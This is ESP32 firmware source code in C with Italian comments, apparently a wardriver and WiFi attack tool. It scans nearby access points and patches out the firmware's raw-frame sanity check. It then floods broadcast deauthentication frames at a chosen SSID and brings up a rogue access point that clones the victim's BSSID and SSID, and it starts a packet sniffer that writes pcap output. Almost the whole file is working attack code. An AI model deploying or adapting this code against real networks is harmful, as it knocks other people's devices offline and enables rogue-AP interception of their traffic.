
#include "freertos/FreeRTOS.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include <time.h>
#include "deauth.h"
#include "lib.h"
#include "sniff.h"
#include <string.h>
#include "esp_log.h"
#include "serializer.h"

#define TASK_NAME "spam_task"

wifi_ap_record_t *apRecords;
uint8_t level = 0, channel = 2;
uint16_t AP_num;
void deauth_task(MacAddr bssid, uint8_t prim_chan);
void attack_method_rogueap(wifi_ap_record_t* ap_record);
void scanWifi();
bool scan = true;



//ritorna il valore del booleano scan 
bool get_scan(){
    return scan;
}
//setta scan a true (quando si refresha la pagina viene chiamata per far partire una nuova scan)
void set_scan(){
    scan = true;
}

uint16_t get_AP_num(){
    return AP_num;
}

//ritorna la lista degli AP (viene chiamata per attaccare e per visualizzarla nel web server)
wifi_ap_record_t* getAPrecords(){

    return apRecords;
}

//attacca il SSID specificato con un attacco DoS di tipo Deauth
void attack_ssid(char* ssid){

    for(uint8_t n = 0; n < AP_num; n++){
        while(apRecords==NULL){
            ESP_LOGI(TASK_NAME, "waiting for aprecords");
            vTaskDelay(1000/portTICK_PERIOD_MS);
        }
        if(!strcmp((char*)apRecords[n].ssid, ssid)){
            for(int u = 0; u < 4; u++){
                if(apRecords != NULL){
                    ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK%d\n",u);
                    deauth_task(apRecords[n].bssid,apRecords[n].primary);
                    attack_method_rogueap(&apRecords[n]);
                    vTaskDelay(1000 / portTICK_PERIOD_MS);
                }

            }
        }
    }
    //risetta il wifi controller dopo l' attacco per continure ad utilizzare il webserver
    //(si usa perche' attack_method_rogueap cambia il controller wifi)
    wifictl_mgmt_ap_start();
    wifictl_restore_ap_mac();   
}


//fa una ricerca di tutti gli Access Point rilevabili dall' ESP
//e li salva in nella lista globale di apRecords
void scanWifi(){
    
    ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
    while(1){
        // ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
        if(scan){
            //ESP_ERROR_CHECK(esp_wifi_scan_start(NULL,true));
            while(esp_wifi_scan_start(NULL,true)!=ESP_OK){ vTaskDelay(1000/portTICK_PERIOD_MS);}
            vTaskDelay(1500 / portTICK_PERIOD_MS);
            apRecords = NULL;
            while(apRecords == NULL){
                    

                uint16_t maxAP; //arbitrary number max APs stored
                esp_wifi_scan_get_ap_num(&maxAP);
                AP_num = maxAP;
                wifi_ap_record_t apRecords_tmp[maxAP];
                esp_wifi_scan_get_ap_records(&maxAP , apRecords_tmp);
                apRecords = (wifi_ap_record_t *)realloc(apRecords, maxAP*sizeof(wifi_ap_record_t));
                memcpy(apRecords,apRecords_tmp,sizeof(wifi_ap_record_t) * maxAP);
                ESP_LOGI(TASK_NAME, "AP_NUM: %d", AP_num);
                vTaskDelay(500 / portTICK_PERIOD_MS);
            }
            esp_wifi_scan_stop();



            for(int i=0;i < AP_num;i++){
                ESP_LOGI(TASK_NAME, "SSID: %s", apRecords[i].ssid);

                ESP_LOGI(TASK_NAME, "BSSID: %x:%x:%x:%x:%x:%x", apRecords[i].bssid[0],apRecords[i].bssid[1],apRecords[i].bssid[2],apRecords[i].bssid[3],apRecords[i].bssid[4],apRecords[i].bssid[5]);
                print_auth_mode(apRecords[i].authmode);
                ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
                ESP_LOGI(TASK_NAME, "########################################\n");
            }    
        }
        ESP_LOGI(TASK_NAME, "scan tick log");
        scan = false;
        vTaskDelay(3000 / portTICK_PERIOD_MS);
    }
}


//sovrascrive la funzione (non documentata) della libreria ufficiale
//la usiamo cosi' possiamo mandare pacchetti di tipo deauth senza controlli
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}


//manda pacchetti di tipo deauth utilizzando una funzione per mandare raw packets
void deauth_task(MacAddr bssid, uint8_t prim_chan) {

    
    const MacAddr TARGET = { 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };

    MacAddr AP = {
        //re place with your AP's mac address
        //98:ca:33
        0x98, 0xca, 0x33, 0x32, 0x65, 0xe4
    };
    esp_err_t res;

    res = deauth(TARGET, AP, bssid, 1, prim_chan);
    
    ESP_LOGI(TASK_NAME," RES:  %s\n", esp_err_to_name(res));
    
    vTaskDelay(5000 / portTICK_PERIOD_MS);

}


uint8_t strlen_uint8(uint8_t *str){
    uint8_t i = 0;
    while(str[i] != '\0'){
        i++;
    }
    return i;
}

//fa un attacco DoS copiando le informazioni (SSID MAC) cosi' che i client della vittima
//si connettono al nostro AP invece dell' AP originale e verranno deautenticati
void attack_method_rogueap(wifi_ap_record_t *ap_record){
    ESP_LOGD(TASK_NAME, "Configuring Rogue AP");
    //ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, ap_record->bssid));
    wifi_config_t ap_config = {};
    ap_config.ap.ssid_len = strlen_uint8((uint8_t *)ap_record->ssid);
    ap_config.ap.channel = ap_record->primary;
    ap_config.ap.authmode = ap_record->authmode;
    memcpy((unsigned char*) ap_config.ap.password,"dummypassword",14);
    ap_config.ap.max_connection = 1;
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
}


//inizializza il pcap_serializer e inizializza 1 thread per sniffare il traffico e 1 task per fare scanWifi()
void wardriver_init(void) {
    pcap_serializer_init();
    wifi_sniffer_init();
    xTaskCreate(&scanWifi, TASK_NAME, 8192 /*profondità dellostack*/, NULL, 5, NULL);
}

